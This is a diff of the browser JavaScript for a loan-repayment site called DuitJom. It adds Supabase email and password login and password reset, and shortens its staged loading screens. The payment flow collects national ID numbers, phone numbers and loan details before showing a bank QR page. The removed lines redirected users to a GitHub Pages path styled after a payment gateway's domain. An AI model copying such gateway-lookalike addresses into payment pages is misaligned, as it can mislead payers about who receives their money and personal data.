@@ -1,75 +1,301 @@
 const SUPABASE_URL = "https://cpincildkjsexmtatcid.supabase.co";
+const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_OfZvXHIJsU8f5exU6bQXug_iqsOJElN";
+const AUTH_REDIRECT_URL = `${window.location.origin}${window.location.pathname}`;
 
-const SUPABASE_PUBLISHABLE_KEY =
-    "sb_publishable_OfZvXHIJsU8f5exU6bQXug_iqsOJELn";
+const supabaseClient = window.supabase?.createClient
+    ? window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
+        auth: {
+            persistSession: true,
+            autoRefreshToken: true,
+            detectSessionInUrl: true
+        }
+    })
+    : null;
 
-const supabaseClient = window.supabase.createClient(
-    SUPABASE_URL,
-    SUPABASE_PUBLISHABLE_KEY
-);
+// Namespaced diagnostic handle; the publishable client remains safe for browser use.
+window.duitjomSupabaseClient = supabaseClient;
+
+let authMode = "signin";
+
+function getSupabaseClient() {
+    if (!supabaseClient) {
+        showAuthMessage("Sistem login belum bersedia. Sila muat semula halaman.", "error");
+        return null;
+    }
+    return supabaseClient;
+}
+
+function showAuthMessage(message, type = "info") {
+    const messageElement = document.getElementById("authMessage");
+    if (!messageElement) return;
+
+    messageElement.textContent = message || "";
+    messageElement.className = "mt-3 min-h-[1.25rem] text-center text-[10px] font-semibold";
+    messageElement.classList.add(
+        type === "error" ? "text-red-600" : type === "success" ? "text-emerald-600" : "text-slate-500"
+    );
+}
+
+function getAuthEmail() {
+    return document.getElementById("authEmail")?.value.trim().toLowerCase() || "";
+}
+
+function setAuthBusy(isBusy) {
+    const submitButton = document.getElementById("authSubmitButton");
+    if (!submitButton) return;
+
+    submitButton.disabled = isBusy;
+    submitButton.classList.toggle("opacity-60", isBusy);
+    submitButton.textContent = isBusy
+        ? "Sila tunggu..."
+        : authMode === "signup" ? "Create account"
+        : authMode === "forgot" ? "Hantar pautan reset"
+        : "Login with email";
+}
+
+function showAuthMode(mode = "signin") {
+    authMode = ["signin", "signup", "forgot"].includes(mode) ? mode : "signin";
+
+    const signInTab = document.getElementById("authSignInTab");
+    const signUpTab = document.getElementById("authSignUpTab");
+    const nameField = document.getElementById("authNameField");
+    const passwordField = document.getElementById("authPasswordField");
+    const confirmField = document.getElementById("authConfirmPasswordField");
+    const passwordInput = document.getElementById("authPassword");
+    const confirmInput = document.getElementById("authConfirmPassword");
+    const nameInput = document.getElementById("authName");
+    const submitButton = document.getElementById("authSubmitButton");
+    const forgotButton = document.getElementById("forgotPasswordButton");
+    const form = document.getElementById("emailPasswordForm");
+
+    const isSignup = authMode === "signup";
+    const isForgot = authMode === "forgot";
+
+    signInTab?.classList.toggle("bg-slate-900", authMode === "signin");
+    signInTab?.classList.toggle("text-white", authMode === "signin");
+    signInTab?.classList.toggle("bg-slate-100", authMode !== "signin");
+    signInTab?.classList.toggle("text-slate-600", authMode !== "signin");
+    signInTab?.setAttribute("aria-selected", String(authMode === "signin"));
+
+    signUpTab?.classList.toggle("bg-slate-900", isSignup);
+    signUpTab?.classList.toggle("text-white", isSignup);
+    signUpTab?.classList.toggle("bg-slate-100", !isSignup);
+    signUpTab?.classList.toggle("text-slate-600", !isSignup);
+    signUpTab?.setAttribute("aria-selected", String(isSignup));
+
+    nameField?.classList.toggle("hidden", !isSignup);
+    passwordField?.classList.toggle("hidden", isForgot);
+    confirmField?.classList.toggle("hidden", !isSignup);
+    forgotButton?.classList.toggle("hidden", isSignup || isForgot);
+    form?.classList.remove("hidden");
+
+    if (nameInput) nameInput.required = isSignup;
+    if (passwordInput) {
+        passwordInput.required = !isForgot;
+        passwordInput.autocomplete = isSignup ? "new-password" : "current-password";
+    }
+    if (confirmInput) confirmInput.required = isSignup;
+
+    if (submitButton) {
+        submitButton.textContent = isSignup ? "Create account" : isForgot ? "Hantar pautan reset" : "Login with email";
+    }
+
+    showAuthMessage(isForgot ? "Masukkan email untuk menerima pautan reset password." : "");
+}
+
+function showForgotPassword() {
+    showAuthMode("forgot");
+}
+
+function showRecoveryPanel() {
+    document.getElementById("emailPasswordForm")?.classList.add("hidden");
+    document.getElementById("authSignInTab")?.classList.add("hidden");
+    document.getElementById("authSignUpTab")?.classList.add("hidden");
+    document.getElementById("forgotPasswordButton")?.classList.add("hidden");
+    document.getElementById("passwordRecoveryForm")?.classList.remove("hidden");
+    showAuthMessage("Pautan reset diterima. Sila tetapkan password baharu.", "info");
+}
 
 async function signInWithGoogle() {
-    const { error } = await supabaseClient.auth.signInWithOAuth({
-        provider: 'google',
-        options: {
-            redirectTo: 'https://duitjom.github.io/payment.ipay88.com'
-        }
+    const client = getSupabaseClient();
+    if (!client) return;
+
+    const { error } = await client.auth.signInWithOAuth({
+        provider: "google",
+        options: { redirectTo: AUTH_REDIRECT_URL }
     });
 
     if (error) {
         console.error(error);
-        alert("Google Sign-In gagal: " + error.message);
+        showAuthMessage("Google Sign-In gagal: " + error.message, "error");
     }
 }
 
-async function sendEmailOTP() {
-    const emailInput = document.getElementById("otpEmail");
-    const otpSection = document.getElementById("otpVerificationSection");
+async function submitEmailPassword(event) {
+    event?.preventDefault();
+    const client = getSupabaseClient();
+    if (!client) return;
 
-    const email = emailInput.value.trim();
+    const email = getAuthEmail();
+    const password = document.getElementById("authPassword")?.value || "";
 
     if (!email) {
-        alert("Sila masukkan alamat email anda.");
-        emailInput.focus();
+        showAuthMessage("Sila masukkan alamat email yang sah.", "error");
+        document.getElementById("authEmail")?.focus();
         return;
     }
 
-    const { error } = await supabaseClient.auth.signInWithOtp({
-        email: email
-    });
+    if (authMode === "forgot") {
+        return sendPasswordReset(event);
+    }
 
+    if (password.length < 6) {
+        showAuthMessage("Password mestilah sekurang-kurangnya 6 aksara.", "error");
+        return;
+    }
+
+    if (authMode === "signup") {
+        const name = document.getElementById("authName")?.value.trim() || "";
+        const confirmation = document.getElementById("authConfirmPassword")?.value || "";
+
+        if (password !== confirmation) {
+            showAuthMessage("Password tidak sepadan.", "error");
+            return;
+        }
+
+        setAuthBusy(true);
+        const { data, error } = await client.auth.signUp({
+            email,
+            password,
+            options: {
+                data: { full_name: name },
+                emailRedirectTo: AUTH_REDIRECT_URL
+            }
+        });
+        setAuthBusy(false);
+
+        if (error) {
+            console.error("Sign-up error:", error);
+            showAuthMessage("Sign up gagal: " + error.message, "error");
+            return;
+        }
+
+        if (data.session) {
+            showAuthMessage("Akaun berjaya dicipta dan anda telah log masuk.", "success");
+        } else {
+            showAuthMessage("Akaun berjaya dicipta. Sila semak email untuk pengesahan.", "success");
+        }
+        return;
+    }
+
+    setAuthBusy(true);
+    const { error } = await client.auth.signInWithPassword({ email, password });
+    setAuthBusy(false);
+
+    if (error) {
+        console.error("Sign-in error:", error);
+        showAuthMessage("Login gagal: " + error.message, "error");
+        return;
+    }
+
+    showAuthMessage("Login berjaya.", "success");
+}
+
+async function sendPasswordReset(event) {
+    event?.preventDefault();
+    const client = getSupabaseClient();
+    if (!client) return;
+
+    const email = getAuthEmail();
+    if (!email) {
+        showAuthMessage("Sila masukkan email untuk reset password.", "error");
+        return;
+    }
+
+    setAuthBusy(true);
+    const { error } = await client.auth.resetPasswordForEmail(email, {
+        redirectTo: AUTH_REDIRECT_URL
+    });
+    setAuthBusy(false);
+
+    if (error) {
+        console.error("Password reset error:", error);
+        showAuthMessage("Reset password gagal: " + error.message, "error");
+        return;
+    }
+
+    showAuthMessage("Pautan reset password telah dihantar. Sila semak email anda.", "success");
+}
+
+async function updateRecoveryPassword(event) {
+    event?.preventDefault();
+    const client = getSupabaseClient();
+    if (!client) return;
+
+    const password = document.getElementById("recoveryPassword")?.value || "";
+    const confirmation = document.getElementById("recoveryPasswordConfirm")?.value || "";
+
+    if (password.length < 6 || password !== confirmation) {
+        showAuthMessage("Pastikan kedua-dua password sama dan sekurang-kurangnya 6 aksara.", "error");
+        return;
+    }
+
+    const { error } = await client.auth.updateUser({ password });
+    if (error) {
+        console.error("Update password error:", error);
+        showAuthMessage("Password baharu gagal disimpan: " + error.message, "error");
+        return;
+    }
+
+    document.getElementById("passwordRecoveryForm")?.classList.add("hidden");
+    document.getElementById("authSignInTab")?.classList.remove("hidden");
+    document.getElementById("authSignUpTab")?.classList.remove("hidden");
+    showAuthMode("signin");
+    showAuthMessage("Password baharu berjaya disimpan. Anda boleh login sekarang.", "success");
+}
+
+async function sendEmailOTP() {
+    const client = getSupabaseClient();
+    if (!client) return;
+
+    const emailInput = document.getElementById("otpEmail");
+    const otpSection = document.getElementById("otpVerificationSection");
+    const email = emailInput?.value.trim() || "";
+
+    if (!email) {
+        alert("Sila masukkan alamat email anda.");
+        emailInput?.focus();
+        return;
+    }
+
+    const { error } = await client.auth.signInWithOtp({ email });
     if (error) {
         console.error("OTP Error:", error);
         alert("Gagal menghantar OTP: " + error.message);
         return;
     }
 
-    otpSection.classList.remove("hidden");
-
+    otpSection?.classList.remove("hidden");
     alert("OTP telah dihantar ke email anda.");
 }
 
-
 async function verifyEmailOTP() {
-    const email = document.getElementById("otpEmail").value.trim();
-    const otp = document.getElementById("otpCode").value.trim();
+    const client = getSupabaseClient();
+    if (!client) return;
+
+    const email = document.getElementById("otpEmail")?.value.trim() || "";
+    const otp = document.getElementById("otpCode")?.value.trim() || "";
 
     if (!email) {
         alert("Email tidak dijumpai.");
         return;
     }
-
     if (!otp || otp.length !== 6) {
         alert("Sila masukkan OTP 6 digit.");
         return;
     }
 
-    const { data, error } = await supabaseClient.auth.verifyOtp({
-        email: email,
-        token: otp,
-        type: "email"
-    });
-
+    const { data, error } = await client.auth.verifyOtp({ email, token: otp, type: "email" });
     if (error) {
         console.error("Verify OTP Error:", error);
         alert("OTP tidak sah atau telah tamat tempoh.");
@@ -77,13 +303,7 @@ async function verifyEmailOTP() {
     }
 
     console.log("Email OTP Login berjaya:", data);
-
     alert("Email berjaya disahkan!");
-    
-    window.location.href = "https://duitjom.github.io/payment.ipay88.com";
-
-    // Contoh: pergi ke halaman seterusnya
-    // window.location.href = "customer-info.html";
 }
 // CODE ASAL AWAK — KEKALKAN
 let timerInstance = null;
@@ -177,353 +397,218 @@ function validatePhone(input) {
 }
 // ---- KAWALAN HALAMAN PEMBAYARAN PINJAMAN (DENGAN 7 SAAT SPINNER) ----
 function goToPaymentPage() {
+    const transitionSpinner = document.getElementById('pageTransitionSpinner');
+    const progressBar = document.getElementById('pageLoadingProgress');
+    const progressPercentage = document.getElementById('pageLoadingPercentage');
+    const progressStatus = document.getElementById('pageLoadingStatus');
 
-    // =====================================================
-    // DUITJOM PREMIUM PAGE LOADING
-    // TEMPOH: 7 SAAT
-    // =====================================================
+    const mainPage = document.getElementById('mainPage');
+    const paymentPage = document.getElementById('paymentPage');
+    if (!mainPage || !paymentPage) return;
 
-    // Tunjukkan spinner transisi 7 saat
-    const transitionSpinner =
-        document.getElementById('pageTransitionSpinner');
-
-    // Progress bar
-    const progressBar =
-        document.getElementById('pageLoadingProgress');
-
-    // Percentage
-    const progressPercentage =
-        document.getElementById('pageLoadingPercentage');
-
-    // Status loading
-    const progressStatus =
-        document.getElementById('pageLoadingStatus');
-
-
-    // =====================================================
-    // PAPARKAN SPINNER
-    // =====================================================
+    // If the asynchronously loaded spinner is unavailable, do not trap the user.
+    if (!transitionSpinner) {
+        mainPage.classList.add('hidden');
+        paymentPage.classList.remove('hidden');
+        paymentPage.classList.add('flex');
+        return;
+    }
 
     transitionSpinner.classList.remove('hidden');
     transitionSpinner.classList.add('flex');
 
-
-    // =====================================================
-    // RESET PROGRESS
-    // =====================================================
-
-    let progress = 0;
-
-    if (progressBar) {
-        progressBar.style.width = '0%';
-    }
-
-    if (progressPercentage) {
-        progressPercentage.innerText = '0%';
-    }
-
-    if (progressStatus) {
-        progressStatus.innerText = 'Memulakan...';
-    }
-
-
-    // =====================================================
-    // STATUS LOADING
-    // =====================================================
-
     const loadingMessages = [
-        {
-            progress: 0,
-            message: 'Memulakan...'
-        },
-        {
-            progress: 15,
-            message: 'Menyediakan halaman...'
-        },
-        {
-            progress: 35,
-            message: 'Memuatkan maklumat...'
-        },
-        {
-            progress: 55,
-            message: 'Menyediakan pembayaran...'
-        },
-        {
-            progress: 75,
-            message: 'Mengemas kini sistem...'
-        },
-        {
-            progress: 90,
-            message: 'Hampir selesai...'
-        },
-        {
-            progress: 100,
-            message: 'Halaman sedia.'
-        }
+        { progress: 0, message: 'Memulakan...' },
+        { progress: 15, message: 'Menyediakan halaman...' },
+        { progress: 35, message: 'Memuatkan maklumat...' },
+        { progress: 55, message: 'Menyediakan pembayaran...' },
+        { progress: 75, message: 'Mengemas kini sistem...' },
+        { progress: 90, message: 'Hampir selesai...' },
+        { progress: 100, message: 'Halaman sedia.' }
     ];
 
-
-    // =====================================================
-    // PROGRESS ANIMATION
-    // =====================================================
-
+    const loadingDuration = 2200;
     const startTime = Date.now();
-    const loadingDuration = 7000;
-
     let progressTimer = null;
 
-
     function updateLoadingProgress() {
+        const elapsed = Date.now() - startTime;
+        const percentage = Math.min(Math.floor((elapsed / loadingDuration) * 100), 99);
 
-        const elapsed =
-            Date.now() - startTime;
-
-        const percentage =
-            Math.min(
-                Math.floor(
-                    (elapsed / loadingDuration) * 100
-                ),
-                99
-            );
-
-
-        // Progress bar
-        if (progressBar) {
-            progressBar.style.width =
-                percentage + '%';
-        }
-
-
-        // Percentage
-        if (progressPercentage) {
-            progressPercentage.innerText =
-                percentage + '%';
-        }
-
-
-        // Cari status yang sesuai
-        let currentMessage =
-            loadingMessages[0].message;
-
-        for (
-            let i = 0;
-            i < loadingMessages.length;
-            i++
-        ) {
-
-            if (
-                percentage >=
-                loadingMessages[i].progress
-            ) {
-
-                currentMessage =
-                    loadingMessages[i].message;
-
-            }
-
-        }
-
-
-        // Update status
+        if (progressBar) progressBar.style.width = percentage + '%';
+        if (progressPercentage) progressPercentage.innerText = percentage + '%';
         if (progressStatus) {
-
-            progressStatus.innerText =
-                currentMessage;
-
+            const currentMessage = loadingMessages.reduce(
+                (message, item) => percentage >= item.progress ? item.message : message,
+                loadingMessages[0].message
+            );
+            progressStatus.innerText = currentMessage;
         }
 
-
-        // Teruskan sehingga 7 saat
         if (elapsed < loadingDuration) {
-
-            progressTimer =
-                requestAnimationFrame(
-                    updateLoadingProgress
-                );
-
+            progressTimer = requestAnimationFrame(updateLoadingProgress);
         }
-
     }
 
+    if (progressBar) progressBar.style.width = '0%';
+    if (progressPercentage) progressPercentage.innerText = '0%';
+    if (progressStatus) progressStatus.innerText = 'Memulakan...';
+    progressTimer = requestAnimationFrame(updateLoadingProgress);
 
-    // Mulakan progress
-    progressTimer =
-        requestAnimationFrame(
-            updateLoadingProgress
-        );
+    window.setTimeout(() => {
+        if (progressTimer) cancelAnimationFrame(progressTimer);
+        if (progressBar) progressBar.style.width = '100%';
+        if (progressPercentage) progressPercentage.innerText = '100%';
+        if (progressStatus) progressStatus.innerText = 'Halaman sedia.';
 
+        window.setTimeout(() => {
+            transitionSpinner.classList.add('hidden');
+            transitionSpinner.classList.remove('flex');
+            mainPage.classList.add('hidden');
+            paymentPage.classList.remove('hidden');
+            paymentPage.classList.add('flex');
 
-    // =====================================================
-    // SELEPAS 7 SAAT
-    // =====================================================
-
-    setTimeout(() => {
-
-        // Hentikan animation frame
-        if (progressTimer) {
-
-            cancelAnimationFrame(
-                progressTimer
-            );
-
-        }
-
-
-        // Jadikan 100%
-        if (progressBar) {
-
-            progressBar.style.width =
-                '100%';
-
-        }
-
-
-        if (progressPercentage) {
-
-            progressPercentage.innerText =
-                '100%';
-
-        }
-
-
-        if (progressStatus) {
-
-            progressStatus.innerText =
-                'Halaman sedia.';
-
-        }
-
-
-        // =================================================
-        // TUNGGU SEKEJAP SUPAYA 100% BOLEH DILIHAT
-        // =================================================
-
-        setTimeout(() => {
-
-            // Sembunyikan spinner
-            transitionSpinner.classList.add(
-                'hidden'
-            );
-
-            transitionSpinner.classList.remove(
-                'flex'
-            );
-
-
-            // =================================================
-            // PINDAH KE HALAMAN PEMBAYARAN
-            // =================================================
-
-            document
-                .getElementById('mainPage')
-                .classList.add('hidden');
-
-            document
-                .getElementById('paymentPage')
-                .classList.remove('hidden');
-
-
-            // =================================================
-            // MUNCULKAN MODAL TUTORIAL
-            // =================================================
-
-            setTimeout(() => {
-
-                document
-                    .getElementById('tutorialModal')
-                    .classList.remove('hidden');
-
-            }, 200);
-
-        }, 250);
-
-    }, 7000);
-
+            const tutorialModal = document.getElementById('tutorialModal');
+            if (tutorialModal) {
+                window.setTimeout(() => tutorialModal.classList.remove('hidden'), 200);
+            }
+        }, 180);
+    }, loadingDuration);
 }
 
 function closeTutorialModal() {
-    document.getElementById('tutorialModal').classList.add('hidden');
-    setTimeout(() => { 
-        document.getElementById('scammerModal').classList.remove('hidden'); 
+    document.getElementById('tutorialModal')?.classList.add('hidden');
+    window.setTimeout(() => {
+        document.getElementById('scammerModal')?.classList.remove('hidden');
     }, 200);
 }
 
 function closeScammerModal() {
-    document.getElementById('scammerModal').classList.add('hidden');
+    document.getElementById('scammerModal')?.classList.add('hidden');
 }
 
 function goToNextStepPage(event) {
-    event.preventDefault();
+    event?.preventDefault();
 
-    const ic = document.getElementById('inputIC').value.replace(/\D/g, '');
-    const phone = document.getElementById('inputPhone').value;
-    const djcust = document.getElementById('inputLoanID').value;
+    const inputIC = document.getElementById('inputIC');
+    const inputPhone = document.getElementById('inputPhone');
+    const inputLoanID = document.getElementById('inputLoanID');
+    const paymentPage = document.getElementById('paymentPage');
+    const loadingPage = document.getElementById('loadingPage');
+    const nextStepPage = document.getElementById('nextStepPage');
+
+    if (!inputIC || !inputPhone || !inputLoanID || !paymentPage || !loadingPage || !nextStepPage) {
+        console.error('Payment flow markup is incomplete.');
+        return false;
+    }
+
+    const ic = inputIC.value.replace(/\D/g, '');
+    const phone = inputPhone.value;
+    const djcust = inputLoanID.value.trim();
 
     if (ic.length !== 12) {
         alert('Sila masukkan nombor kad pengenalan yang sah (12 digit)');
-        return;
+        return false;
     }
 
-    // Semak nombor telefon menggunakan fungsi validatePhone yang sudah dikemaskini
-    if (!validatePhone(document.getElementById('inputPhone'))) {
-        document.getElementById('phoneError').classList.remove('hidden'); // Papar mesej ralat merah
-        return; // Hentikan proses tanpa popup mengganggu
+    if (!validatePhone(inputPhone)) {
+        document.getElementById('phoneError')?.classList.remove('hidden');
+        return false;
     }
 
-    const djcustRegex = /^[DJCUST0-9/]*$/;
-    if (!djcustRegex.test(djcust)) {
+    if (!/^(DJ|CUST)[A-Z0-9/]*$/i.test(djcust)) {
         alert('DJ/CUST NUMBER Tidak Sah');
-        return;
+        return false;
     }
 
-    document.getElementById('paymentPage').classList.add('hidden');
-    document.getElementById('loadingPage').classList.remove('hidden');
-    document.getElementById('loadingPage').classList.add('flex');
+    paymentPage.classList.add('hidden');
+    paymentPage.classList.remove('flex');
+    loadingPage.classList.remove('hidden');
+    loadingPage.classList.add('flex');
 
-    setTimeout(() => {
-        const nama = document.getElementById('inputNama').value;
-        const loanID = document.getElementById('inputLoanID').value;
-        const amaun = document.getElementById('inputAmaun').value;
+    const progressBar = document.getElementById('loadingPageProgress');
+    const progressPercentage = document.getElementById('loadingPagePercentage');
+    const progressStatus = document.getElementById('loadingPageStatus');
+    const loadingDuration = 2200;
+    const startTime = Date.now();
+    let progressTimer = null;
+
+    function updatePageProgress() {
+        const elapsed = Date.now() - startTime;
+        const percentage = Math.min(Math.floor((elapsed / loadingDuration) * 100), 99);
+        if (progressBar) progressBar.style.width = percentage + '%';
+        if (progressPercentage) progressPercentage.innerText = percentage + '%';
+        if (progressStatus) {
+            progressStatus.innerText = percentage < 35
+                ? 'Mengesahkan maklumat...'
+                : percentage < 70
+                    ? 'Menyediakan halaman seterusnya...'
+                    : 'Hampir selesai...';
+        }
+        if (elapsed < loadingDuration) progressTimer = requestAnimationFrame(updatePageProgress);
+    }
+
+    if (progressBar) progressBar.style.width = '0%';
+    if (progressPercentage) progressPercentage.innerText = '0%';
+    if (progressStatus) progressStatus.innerText = 'Memulakan...';
+    progressTimer = requestAnimationFrame(updatePageProgress);
+
+    window.setTimeout(() => {
+        if (progressTimer) cancelAnimationFrame(progressTimer);
+        const nama = document.getElementById('inputNama')?.value.trim() || '';
+        const loanID = inputLoanID.value.trim();
+        const amaun = document.getElementById('inputAmaun')?.value || '0';
+        const amaunFormat = Number.parseFloat(amaun || '0').toFixed(2);
 
         namaPelangganGlobal = nama;
-
         document.getElementById('reviewNama').innerText = nama;
-        document.getElementById('reviewIC').innerText = document.getElementById('inputIC').value;
+        document.getElementById('reviewIC').innerText = inputIC.value;
         document.getElementById('reviewLoanID').innerText = loanID.toUpperCase();
         document.getElementById('reviewPhone').innerText = phone;
-        
-        const amaunFormat = parseFloat(amaun).toFixed(2);
-        document.getElementById('reviewAmaun').innerText = "RM " + amaunFormat;
-
+        document.getElementById('reviewAmaun').innerText = 'RM ' + amaunFormat;
         document.getElementById('displayLoanID').innerText = loanID.toUpperCase();
-        document.getElementById('displayMainAmaun').innerText = "RM " + amaunFormat;
-        document.getElementById('displaySubAmaun').innerText = "RM " + amaunFormat;
-
+        document.getElementById('displayMainAmaun').innerText = 'RM ' + amaunFormat;
+        document.getElementById('displaySubAmaun').innerText = 'RM ' + amaunFormat;
         document.getElementById('qrLoanID').innerText = loanID.toUpperCase();
-        document.getElementById('qrMainAmaun').innerText = "RM " + amaunFormat;
+        document.getElementById('qrMainAmaun').innerText = 'RM ' + amaunFormat;
 
-        document.getElementById('loadingPage').classList.add('hidden');
-        document.getElementById('loadingPage').classList.remove('flex');
-        document.getElementById('nextStepPage').classList.remove('hidden');
-        window.scrollTo({top: 0, behavior: 'smooth'});
-    }, 7000);
+        if (progressBar) progressBar.style.width = '100%';
+        if (progressPercentage) progressPercentage.innerText = '100%';
+        if (progressStatus) progressStatus.innerText = 'Maklumat sedia.';
+
+        window.setTimeout(() => {
+            loadingPage.classList.add('hidden');
+            loadingPage.classList.remove('flex');
+            nextStepPage.classList.remove('hidden');
+            nextStepPage.classList.add('flex');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }, 180);
+    }, loadingDuration);
+
+    return false;
 }
 
 function backToInformationPage() {
-    document.getElementById('nextStepPage').classList.add('hidden');
-    document.getElementById('paymentPage').classList.remove('hidden');
+    document.getElementById('nextStepPage')?.classList.add('hidden');
+    const paymentPage = document.getElementById('paymentPage');
+    paymentPage?.classList.remove('hidden');
+    paymentPage?.classList.add('flex');
     window.scrollTo({top: 0, behavior: 'smooth'});
 }
 
 function goToStep3Page() {
-    document.getElementById('nextStepPage').classList.add('hidden');
-    document.getElementById('step3Page').classList.remove('hidden');
+    document.getElementById('nextStepPage')?.classList.add('hidden');
+    const step3Page = document.getElementById('step3Page');
+    step3Page?.classList.remove('hidden');
+    step3Page?.classList.add('flex');
     window.scrollTo({top: 0, behavior: 'smooth'});
 }
 
 function backToStep2Page() {
-    document.getElementById('step3Page').classList.add('hidden');
-    document.getElementById('nextStepPage').classList.remove('hidden');
+    document.getElementById('step3Page')?.classList.add('hidden');
+    const nextStepPage = document.getElementById('nextStepPage');
+    nextStepPage?.classList.remove('hidden');
+    nextStepPage?.classList.add('flex');
     window.scrollTo({top: 0, behavior: 'smooth'});
 }
 
@@ -542,8 +627,10 @@ function goToQRPage() {
     const bankText = selectBank.options[selectBank.selectedIndex].text.substring(3);
     document.getElementById('qrBankBadge').innerText = bankText;
 
-    document.getElementById('step3Page').classList.add('hidden');
-    document.getElementById('qrPage').classList.remove('hidden');
+    document.getElementById('step3Page')?.classList.add('hidden');
+    const qrPage = document.getElementById('qrPage');
+    qrPage?.classList.remove('hidden');
+    qrPage?.classList.add('flex');
     window.scrollTo({top: 0, behavior: 'smooth'});
 
     startCountdown();
@@ -551,8 +638,10 @@ function goToQRPage() {
 
 function backToStep3Page() {
     clearInterval(timerInstance);
-    document.getElementById('qrPage').classList.add('hidden');
-    document.getElementById('step3Page').classList.remove('hidden');
+    document.getElementById('qrPage')?.classList.add('hidden');
+    const step3Page = document.getElementById('step3Page');
+    step3Page?.classList.remove('hidden');
+    step3Page?.classList.add('flex');
     window.scrollTo({top: 0, behavior: 'smooth'});
 }
 
@@ -603,8 +692,10 @@ function finalSubmission() {
     const susunanAyat = "Terima kasih <span class='font-extrabold text-slate-900'>" + namaPelangganGlobal + "</span> kerana telah berjaya membuat bayaran balik pinjaman anda di <span class='text-blue-400 font-bold'>DuitJom</span>. Pembayaran anda sedang diproses dan akan disemak dalam masa <span class='font-bold'>24 jam</span>. Anda akan menerima notifikasi melalui SMS atau email apabila pembayaran telah disahkan.";
     document.getElementById('thanksMessage').innerHTML = susunanAyat;
 
-    document.getElementById('qrPage').classList.add('hidden');
-    document.getElementById('thanksPage').classList.remove('hidden');
+    document.getElementById('qrPage')?.classList.add('hidden');
+    const thanksPage = document.getElementById('thanksPage');
+    thanksPage?.classList.remove('hidden');
+    thanksPage?.classList.add('flex');
     window.scrollTo({top: 0, behavior: 'smooth'});
 }
 
@@ -740,23 +831,49 @@ function parseJwt(token) {
 }
 
 // =====================================================
-// SEMAK STATUS LOGIN APABILA REFRESH SKRIN
+// SEMAK STATUS LOGIN SUPABASE APABILA REFRESH SKRIN
 // =====================================================
-document.addEventListener("DOMContentLoaded", function () {
-    const loginStatus = localStorage.getItem("googleLogin");
+function updateAuthUI(session, keepRecoveryVisible = false) {
+    const isLoggedIn = Boolean(session?.user) || localStorage.getItem("googleLogin") === "success";
     const btnPay = document.getElementById("btnPembayaranPinjaman");
     const googleSection = document.getElementById("googleSignInSection");
+    const emailAuth = document.getElementById("emailPasswordAuth");
+    const sidebarGoogle = document.getElementById("sidebarGoogleSection");
 
-    if (loginStatus === "success") {
-        // Jika SUDAH log masuk
-        if (googleSection) googleSection.classList.add("hidden");
-        if (btnPay) btnPay.classList.remove("hidden");
+    if (isLoggedIn && !keepRecoveryVisible) {
+        googleSection?.classList.add("hidden");
+        emailAuth?.classList.add("hidden");
+        sidebarGoogle?.classList.add("hidden");
+        btnPay?.classList.remove("hidden");
     } else {
-        // Jika BELUM log masuk (Halaman Pertama)
-        if (btnPay) btnPay.classList.add("hidden");
-        if (googleSection) googleSection.classList.remove("hidden");
+        googleSection?.classList.remove("hidden");
+        emailAuth?.classList.remove("hidden");
+        sidebarGoogle?.classList.remove("hidden");
+        btnPay?.classList.add("hidden");
     }
-});
+}
+
+async function initializeAuth() {
+    if (!supabaseClient) {
+        updateAuthUI(null);
+        return;
+    }
+
+    const { data, error } = await supabaseClient.auth.getSession();
+    if (error) console.error("Supabase session error:", error);
+    updateAuthUI(data?.session || null);
+
+    supabaseClient.auth.onAuthStateChange((event, session) => {
+        if (event === "PASSWORD_RECOVERY") {
+            updateAuthUI(session, true);
+            showRecoveryPanel();
+            return;
+        }
+        updateAuthUI(session);
+    });
+}
+
+document.addEventListener("DOMContentLoaded", initializeAuth);
     /* =========================================================
    DUITJOM NEWS AUTOMATIC SLIDER
    AUTO SLIDE: 2.6 SECONDS
@@ -1287,14 +1404,15 @@ function validateDJCust(input) {
 // =====================================================
 // FUNGSI LOG KELUAR (LOGOUT)
 // =====================================================
-function logoutGoogle() {
-    // 1. Padam rekod log masuk dari sistem browser
+async function logoutGoogle() {
+    if (supabaseClient) {
+        const { error } = await supabaseClient.auth.signOut();
+        if (error) console.error("Supabase sign-out error:", error);
+    }
+
     localStorage.removeItem("googleLogin");
     localStorage.removeItem("userName");
     localStorage.removeItem("userEmail");
-
-    // 2. Refresh / muat semula halaman web secara automatik
-    // Sistem akan kembali memaparkan butang Google Sign-In
     window.location.reload();
 }
 
@@ -1302,18 +1420,25 @@ function logoutGoogle() {
 // FUNGSI MEMUATKAN KOMPONEN HTML DARI FOLDER COMPONENTS/
 // =========================================================
 function loadComponent(containerId, filePath) {
-  fetch(filePath)
+  const container = document.getElementById(containerId);
+  if (!container) return Promise.resolve(false);
+
+  return fetch(filePath, { cache: "no-store" })
     .then(response => {
       if (!response.ok) throw new Error('Gagal memuatkan fail: ' + filePath);
       return response.text();
     })
     .then(data => {
-      const container = document.getElementById(containerId);
-      if (container) {
-        container.innerHTML = data;
-      }
+      container.innerHTML = data;
+      return true;
     })
-    .catch(error => console.error('Ralat Component:', error));
+    .catch(error => {
+      console.error('Ralat Component:', error);
+      if (containerId === "features-container") {
+        container.innerHTML = '<p class="features-load-error">Bahagian ciri-ciri tidak dapat dimuatkan. Sila muat semula halaman.</p>';
+      }
+      return false;
+    });
 }
 
 // JALANKAN PEMUATAN SEMUA KOMPONEN APABILA WEB DIBUKA
@@ -1321,7 +1446,7 @@ document.addEventListener("DOMContentLoaded", function() {
   loadComponent('sidebar-container', 'components/sidebar.html');
   loadComponent('tutorial-modal-container', 'components/tutorial-modal.html');
   loadComponent('scammer-modal-container', 'components/scammer-modal.html');
-  loadComponent('features-container', 'components/features.html');
+  loadComponent('features-container', 'features.html');
 });
 
 
